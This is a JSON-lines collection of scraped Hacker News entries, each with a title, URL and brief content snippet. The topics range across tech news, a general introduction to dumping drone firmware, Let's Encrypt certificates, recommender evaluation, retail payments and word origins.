{"title": "Show HN: Opal Editor, free Obsidian alternative for markdown and site publishing", "url": "https://github.com/rbbydotdev/opal", "content": "Show HN: Opal Editor, free Obsidian alternative for markdown and site publishing", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Counterfactual evaluation for recommendation systems", "url": "https://eugeneyan.com/writing/counterfactual-evaluation/", "content": "Counterfactual evaluation for recommendation systems. [recsysevalmachinelearning]· 8 min read When I first started working on recommendation systems, I thought there was something weird about the way we did offline evaluation. First, we split customer interaction data into training and validation sets. Then, we train our recommenders on the training set before evaluating them on the validation set, usually on metrics such as recall, precision, and NDCG. This is similar to how we evaluate supervised machine learning models and doesn’t seem unusual at first glance. But don’t our recommendations change how customers click or purchase? If customers can only interact with items shown to them, why do we perform offline evaluation on static historical data? It took me a while to put a finger on it but I think this is why it felt weird: We’re treating recommendations as anobservational problem when it really is an interventional problem. Problems solved via supervised machine learning are usually observational problems. Given an observation such as product title, description, and image, we try to predict the product category. Our model learnsP(category=phone|title=“…”, description=“…”, image=image01.jpeg). On the other hand, recommendations are an interventional problem. We want to learn how different interventions (i.e., item recommendations) lead to different outcomes (i.e., clicks, purchases). By using logged customer interaction data as labels, the observational offline evaluation approach ignores the interventional nature of recommendations. As a result, we’re not evaluating if users would click or purchase more due to our new recommendations; we’re evaluating how well the new recommendations fit logged data. Thus, what our model learns isP(view3=iphone|view1=pixel, view2=galaxy)when what we really want isP(click=True|recommend=iphone, view1=pixel, view2=galaxy). The straightforward way to evaluate recommendations as an interventional problem is via A/B testing. Our interventions (i.e., new recommendations) are shown to users, we log their behavior attributed to our new recommendations, and then measure how metrics such as click-thru-rate and conversion change. However, it requires more effort relative to offline evaluation, experiment cycles may be long as we need enough data to make a judgement, and there’s the risk of deploying terrible experiments. Also, we may not have easy access to A/B testing we’re working on the research side of things. The less direct approach iscounterfactualevaluation. Counterfactual evaluation tries to answer “what would have happened if we show users our new recommendations instead of the existing recommendations?” This allows us to estimate the outcomes of potential A/B tests without actually running them. The most widely known technique for counterfactual evaluation isInverse Propensity Scoring (IPS). It’s sometimes also referred to as inverse probability weighting/sampling. The intuition behind it is that we can estimate how customer interactions will change—by reweighting how often each interaction will occur—based on how much more (or less) each item is shown by our new recommendation model. Here’s the IPS equation.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Apple is fighting for TSMC capacity as Nvidia takes center stage", "url": "https://www.culpium.com/p/exclusiveapple-is-fighting-for-tsmc", "content": "Apple is fighting for TSMC capacity as Nvidia takes center stage. When CC Wei visited Cupertino last August, he had bad news for his largest client. Apple would need to acquiesce to the largest price rise in years, TSMC’s CEO told its executives. Tim Cook and his team took the news on the chin. Wei had been telegraphing hikes in earnings calls over the past few quarters, and the Taiwanese chip maker’s rising gross margins were testament to its increasing pricing power. That wasn’t the worst news, my sources tell me. Apple, which once held a dominant position on TSMC’s customer list, now needs to fight for production capacity. With the continuing AI boom, and each GPU from clients like Nvidia and AMD taking up a larger footprint per wafer, the iPhone maker’s chip designs are no longer guaranteed a place among TSMC’s almost two dozen fabs. What Wei probably didn’t tell Cook is that Apple may no longer be his largest client. According toCulpiumanalysis and discussions with sources in the supply chain, Nvidia likely took top spot in at least one or two quarters of last year. “We don’t discuss that,” Chief Financial Officer Wendell Huang toldCulpiumThursday when asked about the change in client rankings. Please subscribe toCulpiumand show your support.  Final data will be unveiled in a few months when TSMC releases its annual report — which includes revenue from its top clients — but there’s every chance that Apple’s lead for the full year narrowed significantly and may have even fallen below Nvidia’s. If it didn’t happen in 2025, then it’s almost certain to do so in 2026, my sources tell me.1 Public data helps tells the story.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: Lite Bible – A fast, minimalist Bible reader", "url": "https://litebible.org/", "content": "Show HN: Lite Bible – A fast, minimalist Bible reader", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Drone Hacking Part 1: Dumping Firmware and Bruteforcing ECC", "url": "https://neodyme.io/en/blog/drone_hacking_part_1/", "content": "Drone Hacking Part 1: Dumping Firmware and Bruteforcing ECC. In July 2025, we from Neodyme got together in Munich and did security research on a bunch of IoT devices, ranging from bluetooth headsets, to door locks, to drones. One of these was the Potensic Atom 2. It’s a photo and video drone with a gimbal-stabilized 4K camera and a remote control that you hook up to your own smartphone and the proprietary app. If you’ve ever flown a DJI Mini 4K, this drone will look very familiar to you.  Potensic Atom 2  This post is part of atwo-part seriesthat will cover how we disassembled the drone and dumped the firmware from the NAND chip and how we analyzed the drone’s firmware, app, and remote control to find some backdoors and vulnerabilities. One of the most important pieces of information you can acquire when setting up to hack a device is its firmware. If you want to reverse engineer the software that’s running on the drone and find vulnerabilities in that, then you need a copy of it in the first place. Now there are a couple of ways to go about that, some are less intrusive and some are more effective. You might get lucky and be able to justdownload the firmwareas a firmware update from the manufacturer’s website. However, those update sites are often not publicly documented and can be locked behind authorization checks or encrypted. Encrypted firmwares can still be useful - you “just” need to reverse engineer the on-device decryption process. For the Atom 2, downloading the firmware updates required having a valid drone and remote control serial numberandthe firmware update was also encrypted. Without having the decryption logic, we put this approach on ice during our initial research. Another really comfortable approach is to use exposeddebug interfaceslike JTAG or UART. However, those are often undocumented, unlabeled, or entirely removed for public versions. We didn’t find any on the Atom 2. What we can always do, though not necessarily always successful, is solder off the entire NAND chip anddump the firmwarebyte by byte. This has the risk of breaking the NAND chip and/or the rest of the board if you’re not careful. Also, some devices, like modern smart phones, encrypt their persistent storage with key material stored in, e.g., the TPM. If that is the case, then simply soldering off the NAND chip will leave you with unusable encrypted data. Fortunately, the Atom 2’s NAND contents are not encrypted, as we find out later.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Predicting OpenAI's ad strategy", "url": "https://ossa-ma.github.io/blog/openads", "content": "Predicting OpenAI's ad strategy. Jan 18, 2026 9min read The World is Ads Here we go again, the tech press is having another AI doom cycle. I've primarily written this as a response to an NYT analyst painting a completely unsubstantiated, baseless, speculative,outrageous, EGREGIOUS, preposterous\"grim picture\" onOpenAI going bust. Mate come on. OpenAI is not dying, they're not running out of money. Yes, they're creating possibly the craziest circular economy and defying every economics law since Adam Smith published 'The Wealth of Nations'. $1T in commitments is genuinely insane. But I doubt they're looking to be acquired; honestly by who? you don't raise $40 BILLION at $260 BILLION VALUATION to get acquired. It's all for the $1T IPO. But it seems that the pinnacle of human intelligence: the greatest, smartest, brightest minds have all come together to... build us another ad engine. What happened to superintelligence and AGI? See if OpenAI was not a direct threat to the current ad giants would Google be advertising Gemini every chance they get? Don't forget they're also capitalising on their brand new high-intent ad funnel bylaunching ads on GeminiandAI overview. Let's crunch the numbers. March: Closed$40B funding round at $260B valuation,thelargest raise by a private tech company on record.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Fil-Qt: A Qt Base build with Fil-C experience", "url": "https://git.qt.io/cradam/fil-qt", "content": "Fil-Qt: A Qt Base build with Fil-C experience", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Memdeklaro – The humanitarian open source alternative to government ID", "url": "https://memdeklaro.computersforpeace.net", "content": "Memdeklaro – The humanitarian open source alternative to government ID. Memdeklaro is a philosophical project that empowers people toself-declare their own identity- without third parties such as birth parents, birth cultures or birth countries. Memdeklaro positions itself as ahumanitarian alternativeto the exclusionary state monopoly on identity and supports the three freedoms: freedom of name, freedom of belief and freedom of association. Memdeklaro supports a world where people are judged only on their character, beliefs and actions, not on where they were born, who they were born to, or what their birth culture was. A world where individuals have power over their own lives - the power to leave corrupt governments, hostile cultures and abusers, and thrive in a self-chosen community. \"Self-declaration of identity gives people the power to decide their own fate, and creates a world where actions and beliefs matter more than arbitrary circumstances of birth.\" Millions of people worldwide have no access to government ID.Nation-states routinely refuse to issue birth certificates, national ID cards and passports to people, most often due to the circumstances of their birth, rather than due to their own actions as an adult. This group may include stateless people, refugees, people who weren’t registered at birth, and people who escaped from child abuse, domestic abuse or cult abuse. As government ID is increasingly required for employment, housing, healthcare, education, travel and daily life necessities, this leaves people at best on the edge of society or at worst criminalized for existing. In this situation, cash in hand jobs and informal apartment rentals are an essential lifeline, but as the state cracks down on the gray market economy, exclusion from the state monopoly on identity could mean life or death. \"You may think economic exclusion — banned from employment, housing, healthcare, education, banking, travel, contracts, mail, sim cards and more — would be a punishment for only the most severe of crimes. But for stateless people, refugees, victims of abuse and people who weren’t registered at birth, it is a punishment for being born.\" In an ideal world, everyone would be granted a legal identity at age 18, without requirements and without needing permission from birth parents or the birth country. Or there would be a way to earn a legal identity as an adult, or receive an identity based on fingerprints and a photo. Or at least a way to get a stateless passport in order to be allowed to apply for a work, marriage or humanitarian visa in a different country. An adult would be able to independently legalize themselves through their own efforts, regardless of the situation that they were born into. However, the United Nations no longer issues Nansen Passports (despite that they saved thousands of lives), the Red Cross rarely issues Emergency Travel Documents, and nation-states generally refuse to issue stateless passports, even though these exist by law. Access to asylum procedures, stateless determination procedures, delayed registration of birth, child protective services or witness protection is often denied, or in the worst case, the victim is forcibly returned to the abusers against their will. Furthermore, the collectivist concept of citizenship can be dangerous. For example, if someone does not identify with their birth culture, they should not be forced to follow it for life. Instead, they should be free to dissent against this culture and leave this culture’s jurisdiction. Even worse is conscription - the cruel system where a nation-state can force someone against their will to kill or be killed, just because they happened to be born inside a certain territory.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: HTTP:COLON – A quick HTTP header/directive inspector and reference", "url": "https://httpcolon.dev/", "content": "Show HN: HTTP:COLON – A quick HTTP header/directive inspector and reference. HTTP headers are a fundamental component of the HTTP protocol, which is the backbone of the internet. These headers contain important information about the request and response, such as content type, caching instructions, authentication tokens, and more. By understanding how to read and manipulate HTTP headers, developers can optimize their web applications for performance, security, and functionality. Moreover, HTTP headers play a critical role in API integrations, allowing developers to communicate with external services and systems. In short, HTTP headers are an essential tool in the web developer's arsenal, and any developer serious about building high-quality web applications should invest the time to learn and master them.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Bzfs 1.17.0 near real-time ZFS replication tool is out", "url": "https://github.com/whoschek/bzfs", "content": "Bzfs 1.17.0 near real-time ZFS replication tool is out", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Ask HN: Is it still worth pursuing a software startup?", "url": "item?id=46654726", "content": "Ask HN: Is it still worth pursuing a software startup?", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "6-Day and IP Address Certificates Are Generally Available", "url": "https://letsencrypt.org/2026/01/15/6day-and-ip-general-availability", "content": "6-Day and IP Address Certificates Are Generally Available. Short-lived and IP address certificates are now generally available from Let’s Encrypt. These certificates are valid for 160 hours, just over six days. In order to get a short-lived certificate subscribers simply need to select the ‘shortlived’certificate profilein their ACME client. Short-lived certificates improve security by requiring more frequent validation and reducing reliance on unreliable revocation mechanisms. If a certificate’s private key is exposed or compromised, revocation has historically been the way to mitigate damage prior to the certificate’s expiration. Unfortunately, revocation is an unreliable system so many relying parties continue to be vulnerable until the certificate expires, a period as long as 90 days. With short-lived certificates that vulnerability window is greatly reduced. Short-lived certificates are opt-in and we have no plan to make them the default at this time. Subscribers that have fully automated their renewal process should be able to switch to short-lived certificates easily if they wish, but we understand that not everyone is in that position and generally comfortable with this significantly shorter lifetime. We hope that over time everyone moves to automated solutions and we can demonstrate that short-lived certificates work well. Our default certificate lifetimes will be going from 90 days down to 45 days over the next few years,as previously announced. IP address certificates allow server operators to authenticate TLS connections to IP addresses rather than domain names. Let’s Encrypt supports both IPv4 and IPv6. IP address certificates must be short-lived certificates, a decision we made because IP addresses are more transient than domain names, so validating more frequently is important. You can learn more about our IP address certificates and the use cases for them from ourpost announcing our first IP Certificate. We’d like to thank the Open Technology Fund and Sovereign Tech Agency, along with ourSponsorsand Donors, for supporting the development of this work.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Gene therapy advances as scientists guide jumping DNA to target faulty genes", "url": "https://medicalxpress.com/news/2025-12-gene-therapy-advances-scientists-dna.html", "content": "Gene therapy advances as scientists guide jumping DNA to target faulty genes. share this! Share Tweet Share Email December 17, 2025 by Matthew Campbell,University of Hawaii at Manoa edited byLisa Lock, \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\treviewed byAndrew Zinin  ", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Huge amounts of extra land needed for RFK Jr's meat-heavy diet guidelines", "url": "https://www.theguardian.com/environment/2026/jan/20/rfk-jr-trump-meat-diet-guidelines-land", "content": "Huge amounts of extra land needed for RFK Jr's meat-heavy diet guidelines. Even 25% increase in meat and dairy consumption would require 100m more acres of agricultural land, analysis says TheTrump administration’s new dietaryguidelinesurging Americans to eat far more meat and dairy products will, if followed, come at a major cost to the planet via huge swathes of habitat razed for farmland and millions of tons of extra planet-heatingemissions. A new inverted foodpyramidrecently released by Donald Trump’s health department emphasizes pictures of steak, poultry, ground beef and whole milk, alongside fruits and vegetables, as the most important foods to eat. The new guidelines are designed to nearly double the amount of protein currently consumed by Americans. “Protein and healthy fats are essential and were wrongly discouraged in prior dietary guidelines,” saidRobert F Kennedy Jr, the US health secretary. “We are ending the war on saturated fats.” But a surge in meat-eating by Americans would involve flattening vast tracts of ecosystems such as forests to make way for thehefty environmental hoofprintof raised livestock, emitting large quantities of greenhouse gases in the process, experts have warned. Even a 25% increase in the amount of protein consumed in this way in the US would require about 100m acres of additional agricultural land each year, an area around the size of California, and add hundreds of millions of tons of extra pollution to an alreadyoverheatingplanet, according to an estimate by the World Resources Institute (WRI), a non-profit research body. “We are seeing millions of acres of forest cut down and agricultural expansion is the lead driver of that – adding 100m acres to that to feed the US means additional pressure on the world’s remaining ecosystems,” said Richard Waite, the director of agriculture initiatives at WRI. “It’s already hard to feed the global population while reducing emissions and stopping deforestation, and a shift in this direction would make the challenge even harder. We need to reduce the impact of our food systems urgently and the US is an important piece of the puzzle in doing that.” While many Americans will simply ignore the guidelines, the new framework will probably influence institutions such as schools and federal workplaces. The average Americanalready eatsabout 144kg (317lbs) of meat and seafood a year, second globally only to Portugal, and ingests more protein than previous federal government guidelines recommended. Any further increase will be felt in places such as theAmazon rainforest, which is already beingfelledat a rapid rate for cattle ranches and to grow livestock feed.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Kip: A programming language based on grammatical cases of Turkish", "url": "https://github.com/kip-dili/kip", "content": "Kip: A programming language based on grammatical cases of Turkish", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "What twenty years of DevOps has failed to do", "url": "https://www.honeycomb.io/blog/you-had-one-job-why-twenty-years-of-devops-has-failed-to-do-it", "content": "What twenty years of DevOps has failed to do. Let’s start with a question. What is DevOps all about? I’ll tell you my answer. In retrospect, I think the entire DevOps movement was a mighty, twenty year battle to achieve one thing: a single feedback loop connecting devs with prod. On those grounds, it failed. Not because software engineers weren’t good at their jobs, or didn’t care enough. It failed because the technology wasn’t good enough. The tools we gave them weren’t designed for this, so using them could easily double, triple, or quadruple the time it took to do their job: writing business logic. This isn’t true everywhere. Please keep in mind thatall data tools are effectively fungibleif you can assume an infinite amount of time, money, and engineering skill. You can run production off an Excel spreadsheet if you have to, and some SREshave done so. That doesn’t make it a great solution, the right use of resources, or accessible to the median engineering org. The good news is thatAI has changed this. The technology we have now is good enough to create a feedback loop between developers and production systems for the median engineering team, for the first time ever. The bad news is also thatAI has changed this. Our existing feedback loops are unprepared to deal with the current amount of code slop. And I think we all know what the volume of code slop is about to do: (Oh yeah, guess what I learned to do over the break? STICK ART, baby doll.) I know this is a big, spicy claim. And since I got as pissed off as anyone when vendors were posting clickbait about “DEVOPS IS DEAD,” I’m going to back up and show you my argument from scratch. I’m not saying this in an accusatory, inflammatory kind of way. The truth is, we were all sensing and circling around the same problem, and it was the right one. We did the best we could with the tools that we had. If your business makes money by building products with software, this is what progress looks like: you build something new, ship it to users, and see what happens.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Profession by Isaac Asimov (1957)", "url": "https://www.abelard.org/asimov.php", "content": "Profession by Isaac Asimov (1957). Profession, \r\n        copyright ©1957 by Street and Smith Publications, Inc., from ISAAC \r\n        ASIMOV: THE COMPLETE STORIES OF VOL. 1 by Isaac Asimov.Used by permission of Doubleday, a division of Random House, Inc.For on-line information about other Random \r\n        House, Inc. books and authors, see the Internet Web site athttp://www.randomhouse.com. Another \r\n        sci-fi short story at abelard.org:And Then There \r\n        Were None by Eric Frank Russell George Platen could not conceal the longing in his voice. It was \r\n        too much to suppress. He said, “Tomorrow’s 1 May. Olympics!” He rolled over on his stomach and peered over the foot of his bed at his \r\n        roommate. Didn’t he feel it, too? Didn’t this make some impression \r\n        on him? George’s face was thin and had grown a trifle thinner in the nearly \r\n        year and a half that he had been at the House. His figure was slight but the \r\n        look in his blue eyes was as intense as it had ever been, and right now there \r\n        was a trapped look in the way his fingers curled against the bedspread. George’s roommate looked up briefly from his book and took the opportunity \r\n        to adjust the light-level of the stretch of wall near his chair. His name \r\n        was Hali Omani and he was a Nigerian by birth. His dark brown skin and massive \r\n        features seemed made for calmness, and mention of the Olympics did not move \r\n        him. “I know, George.” George owed much to Hali’s patience and kindness when it was needed, \r\n        but even patience and kindness could be overdone. Was this a time to sit there like a statue built of some dark, warm wood? George wondered if he himself would grow like that after ten years here and \r\n        rejected the thought violently. No!", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Erdos 281 solved with ChatGPT 5.2 Pro", "url": "https://twitter.com/neelsomani/status/2012695714187325745", "content": "Erdos 281 solved with ChatGPT 5.2 Pro", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Emoji Use in the Electronic Health Record is Increasing", "url": "https://jamanetwork.com/journals/jamanetworkopen/fullarticle/2843883", "content": "Emoji Use in the Electronic Health Record is Increasing", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Kraków, Poland in top 5 worst air quality worldwide", "url": "https://www.iqair.com/world-air-quality-ranking", "content": "Kraków, Poland in top 5 worst air quality worldwide. 2024 World Air Quality Report 2024 World Air Quality Report HealthPro Series Atem Series AirVisual Series Sign up below to join the clean air community and receive the latest air quality news and science to help improve the air around you. Swiss Quality. Global Support. We stand behind our products and your satisfaction is our goal", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Dev-owned testing: Why it fails in practice and succeeds in theory", "url": "https://dl.acm.org/doi/10.1145/3780063.3780066", "content": "Dev-owned testing: Why it fails in practice and succeeds in theory", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Google confirms 'high-friction' sideloading flow is coming to Android", "url": "https://www.androidauthority.com/google-sideloading-android-high-friction-process-3633468/", "content": "Google confirms 'high-friction' sideloading flow is coming to Android. Affiliate links on Android Authority may earn us a commission.Learn more. January 18, 2026  Google has responded to our recent report on new Google Play strings hinting atchanges to how Android will handle sideloaded appsin the future. The company has now confirmed that a “high-friction” install process is on the way. Don’t want to miss the best fromAndroid Authority? Replying to our story on X, Matthew Forsyth, Director of Product Management, Google Play Developer Experience & Chief Product Explainer,saidthe system isn’t a sideloading restriction, but an “Accountability Layer.” Advanced users will still be able to choose “Install without verifying,” though Google says that path will involve extra steps meant to ensure users understand the risks of installing apps from unverified developers. That explanation broadly matches what we’re seeing in recent versions of Google Play, where new warning messages emphasize developer verification, internet requirements, and potential risks, while still allowing users to proceed. What remains to be seen is how far Google takes this “high-friction” approach. Clear warnings are one thing, butquietly making sideloading more painfulis another. Android’s openness has always depended on power users being able to install apps without excessive hoops. For now, Google hasn’t suggested requirements like using a PC or external tools, and we hope the added friction is limited to risk education. Thank you for being part of our community. Read ourComment Policybefore posting.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Ask HN: Do you have any evidence that agentic coding works?", "url": "item?id=46691243", "content": "Ask HN: Do you have any evidence that agentic coding works?", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The Overcomplexity of the Shadcn Radio Button", "url": "https://paulmakeswebsites.com/writing/shadcn-radio-button/", "content": "The Overcomplexity of the Shadcn Radio Button. The other day I was asked to update the visual design of radio buttons in a web\napp at work. I figured it couldn't be that complicated. It's just a radio button\nright? Boom! Done. Radio buttons are a built-in HTML element. They've been around for\n30 years. The browser makes it easy. Time for a coffee. I dug into our codebase and realized we were using two React components fromShadcnto power our radio buttons:<RadioGroup>and<RadioGroupItem>. For those unfamiliar with Shadcn, it's a UI framework that provides a bunch of\nprebuilt UI components for use in your websites. Unlike traditional UI\nframeworks like Bootstrap, you don't import it with a script tag ornpm install. Instead you run a command that copies the components into your\ncodebase. Here's the code that was exported from Shadcn into our project: Woof... 3 imports and 45 lines of code. And it's importing a third party icon\nlibrary just to render a circle. (Who needs CSSborder-radiusor the SVG<circle>element when you can add a third party dependency instead?) All of the styling is done by the 30 different Tailwind classes in the markup. I\nshould probably just tweak those to fix the styling issues. But now I'm distracted, annoyed, and curious. Where's the actual<input>?\nWhat's the point of all this? Let's dig a little deeper. The Shadcn components import components from another library called Radix. For\nthose unfamiliar with Radix, it's a UI framework that provides a bunch of\nprebuilt UI components... Wait a second! Isn't that what I just said about Shadcn? What gives? Why do we\nneed both? Let's see what the Radix docs say:", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Michelangelo's first painting, created when he was 12 or 13", "url": "https://www.openculture.com/2026/01/discover-michelangelos-first-painting.html", "content": "Michelangelo's first painting, created when he was 12 or 13. inArt,History|   \tJanuary 15th, 20265 Comments    Think back, if you will, to the works of art you cre­at­ed at age twelve or thir­teen. For many, per­haps most of us, our out­put at that stage of ado­les­cence amount­ed to direc­tion­less doo­dles, chaot­ic comics, and a few unsteady-at-best school projects. But then, most of us did­n’t grow up to be Michelan­ge­lo. In the late four­teen-eight­ies, when that tow­er­ing Renais­sance artist was still what we would now call a “tween,” he paint­edThe Tor­ment of Saint Antho­ny, a depic­tion of the tit­u­lar reli­gious fig­ure beset by demons in the desert. Though based on a wide­ly known engrav­ing, it nev­er­the­less shows evi­dence of rapid­ly advanc­ing tech­nique, inspi­ra­tion, and even cre­ativ­i­ty — espe­cial­ly when placed under the infrared scan­ner. For about half a mil­len­ni­um,The Tor­ment of Saint Antho­nywas­n’t thought to have been paint­ed by Michelan­ge­lo. As explained inthe video from Inspi­rag­gio just below, when the paint­ing sold at Sothe­by’s in 2008, the buy­er took it to the Met­ro­pol­i­tan Muse­um of Art for exam­i­na­tion and clean­ing. “Beneath the lay­ers of dirt accu­mu­lat­ed over the cen­turies,” says the nar­ra­tor, “a very par­tic­u­lar col­or palette appeared. “The tones, the blends, the way the human fig­ure was treat­ed: all of it began to resem­ble the style Michelan­ge­lo would use years lat­er in none oth­er thanthe Sis­tine Chapel.” Infrared reflec­tog­ra­phy sub­se­quent­ly turned uppen­ti­men­ti, or cor­rec­tion marks, a com­mon indi­ca­tion that “a paint­ing is not a copy, but an orig­i­nal work cre­at­ed with artis­tic free­dom.”   It was theKim­bell Art Muse­umin Fort Worth, Texas that first bet big on the prove­nance ofThe Tor­ment of Saint Antho­ny. Its new­ly hired direc­tor pur­chased the paint­ing after turn­ing up “not a sin­gle con­vinc­ing argu­ment against the attri­bu­tion.” Thus acquired, it became “the only paint­ing by Michelan­ge­lo locat­ed any­where in the Amer­i­c­as, and also just one of four easel paint­ings attrib­uted to him through­out his entire career,” dur­ing most of which he dis­par­aged oil paint­ing itself. About a decade lat­er, and after fur­ther analy­sis, the art his­to­ri­an Gior­gio Bon­san­ti put his con­sid­er­able author­i­ty behind a defin­i­tive con­fir­ma­tion that it is indeed the work of the young Michelan­ge­lo. There remain doubters, of course, and even the noto­ri­ous­ly uncom­pro­mis­ing artist him­self may have con­sid­ered it an imma­ture work unwor­thy of his name. But who else could have cre­at­ed an imma­ture work like it?", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Boeing knew of flaw in part linked to UPS plane crash, NTSB report says", "url": "https://www.bbc.com/news/articles/cly56w0p9e1o", "content": "Boeing knew of flaw in part linked to UPS plane crash, NTSB report says. An aircraft that crashed in flames in Kentucky in November had a structural flaw  that had been identified by Boeing on similar planes 15 years ago, according to investigators. The MD-11F freighter operated by UPS, crashed after one of its engines separated from the wing as it was preparing to take off from Louisville. The plane briefly lifted off from the runway, before hurtling out of control into an industrial area. Fifteen people died as a result, including three crew and 12 on the ground. In anupdate report, the US National Transportation Safety Board (NTSB) revealed that cracks found in the engine mounting assembly had previously occurred on several other aircraft. At the time the manufacturer responsible for the aircraft, Boeing, concluded that the issue \"would not result in a safety of flight condition\". The MD-11 is a relatively elderly design that was originally produced by McDonnell Douglas.  Boeing acquired the company in 1997. The last MD-11 came off the production line in 2001, but Boeing has continued providing parts and service support. In the aftermath of the Kentucky disaster, the NTSB issued a preliminary report which drew attention to cracks in the engine attachment mechanism. Its latest update goes further, describing fractures due to evidence of \"fatigue\" – or repeated stresses - in a critical bearing, as well as the mounting it is meant to sit in. It points out that Boeing had previously found failures of the same part on four occasions, affecting three different aircraft. In 2011, the company sent a \"service letter\" to operators warning them of its findings. This is a non legally-binding document used to alert operators about important safety or maintenance information. In this case, Boeing recommended that the part be included in a general visual inspection every five years. It also pointed out changes to the inspection procedure contained in the aircraft maintenance manual, and drew attention to a revised bearing assembly that could be fitted – although this was not mandatory.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Why Walmart still doesn't support Apple Pay", "url": "https://9to5mac.com/2026/01/18/heres-why-walmart-still-doesnt-support-apple-pay/", "content": "Why Walmart still doesn't support Apple Pay. The year is 2026 and Walmart still doesn’t accept Apple Pay at any of its stores in the United States. This makes it one of the last remaining major retailers to not support Apple’s contactless payment platform. It’s a limitation that’s once again going viral on social media. Here are a few reasons why Walmart doesn’t support Apple Pay … There’s one important thing to note: Walmart doesn’t acceptanyform of NFC payment in the United States. It’s not just a limitation on Apple Pay. The retailer doesn’t take Google Pay, Samsung Pay, or even let you tap your contactless physical card to pay. This story also focuses on the United States. Most Walmart locations in Canada, for example, do accept Apple Pay. First, Walmart has its own contactless payment platform called Walmart Pay, which itlaunched in 2016. Walmart Pay, however, isn’t an NFC-based tap-to-pay platform like Apple Pay. Instead, it’s based on a QR code infrastructure. To use Walmart Pay, you have to add a debit or credit card to the Walmart app on your iPhone, then scan a QR code at checkout to pay with your iPhone. It’s not nearly as convenient as Apple Pay. Walmart also has its Scan and Go platform for Walmart+ subscribers. This allows people to use the Walmart or Sam’s Club app to scan items as they shop, then go to self-checkout to finalize their purchase without having scan all their items at once. Apple Pay also isn’t supported when using Scan and Go. This might be the biggest reason Walmart doesn’t support Apple Pay. Walmart relies on collecting your data to build profiles on your purchasing patterns and trends. Tracking this type of purchase history is something Walmart does for targeting advertising, marketing, and more. When you use Walmart Pay, it’s incredibly easy for Walmart to build that customer profile on you. When you use Scan and Go, all of that same information is handed over. When you use Apple Pay or other payment methods, it’s much harder for Walmart (and other retailers) to do this. Apple Pay’s privacy and security protections, like not sharing any information about your actual card with the retailer, makes this type of tracking trickier. This is why Walmart wants people to use Walmart Pay if they want to pay from their phone. If you check out with Walmart Pay or Scan and Go, everything is linked to your Walmart account. If you had the option to pay with Apple Pay, you’d sharea lotless information with Walmart.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The 600-year-old origins of the word 'hello'", "url": "https://www.bbc.com/culture/article/20260113-hello-hiya-aloha-what-our-greetings-reveal", "content": "The 600-year-old origins of the word 'hello'. It's been 200 years since the word \"hello\" was first used in print – though its beginnings date back to the 15th Century. How has the language of greetings evolved around the world - and what does it tell us about ourselves? We use \"hello\" dozens of times a day without thinking – during phone calls, emails and face-to-face encounters. We sing it along with Adele and Lionel Richie, and we have watched it spun into moments of screen gold in Jerry Maguire (\"You had me at hello\"), and Scarface (\"Say hello to my little friend!\"). It's been used to sell everything from mobile phones (Motorola's \"Hello, Moto\") to lingerie (Wonderbra's iconic \"Hello boys\"), and it has been borrowed to name computer programs and celebrity magazines. In print, this ubiquitous, friendly greeting has a surprisingly short history. Two centuries ago, on 18 January 1826, \"hello\" made what is thought to be its earliest recorded appearance on the page, in a Connecticut newspaper called The Norwich Courier. Hidden among the column inches, it was a modest in-ink debut for a word that would go on to greet much of the modern world. By the 1850s, it had crossed the Atlantic to Britain – appearing in publications such as the London Literary Gazette – and became increasingly common in print. Like the go-to greetings in other languages, \"hello\" also says something about the English-speaking world – depending on which variation, abbreviation or inflection of the word we choose to use. There are plenty of such forms. Whether due to dialect or accent influences, or the brevity demanded by online communication, which \"hello\" you choose says a lot about you, and can indicate age, nationality, or even mood. According to linguists, elongated variations such as \"heyyy\" could be construed as flirtatious, \"hellaw\" might suggest you're from the southern US, \"howdy\" from western US, and the clipped \"hi\" may indicate a curt disposition. \"It can be pronounced and inflected in many different ways, and these subtle intonational contours can change its meaning,\" says Alessandro Duranti, professor of linguistic anthropology at the University of California, Los Angeles. \"For example, when someone says 'hello' with a stretched final vowel, it can question what the other person just said, as in 'Hello, are you paying attention?' or 'Hello, you must be kidding.'\" This capacity to convey nuance through tone and form is no modern invention; even in its first printed appearances, \"hello\" was a patchwork of influences, derivations and applications drawn from several languages. The pre-printed origins of the word \"hello\" are disputed. The most commonly cited etymology is the Old High German \"halâ\" – a cry historically used to hail a ferryman. The Oxford English Dictionary also points to \"halloo\" (a hunting call that urged hounds to run faster) as a possible linguistic root. It notes several early spellings, including \"hullo\", \"hillo\" and \"holla\" – the latter thought to have derived from the 15th-Century French \"hol\", an exclamation meaning \"whoa!\" or \"stop!\". In English sources, the OED lists the earliest form as the late-16th-Century \"hollo\". Simon Horobin, professor of English language and literature at Magdelen College, Oxford, notes that such semantic shifts and spelling changes may also be explained by regional accents and differences in pronunciation. \"Especially in the example of 'ello' which shows the prevalent – though now stigmatised – feature of h-dropping,\" he tells the BBC, referring to the classist English stereotype of a dropped 'h' indicating a lack of education. \"But for origins and early history,\" he adds, \"we are dependent upon written evidence, which is patchy at 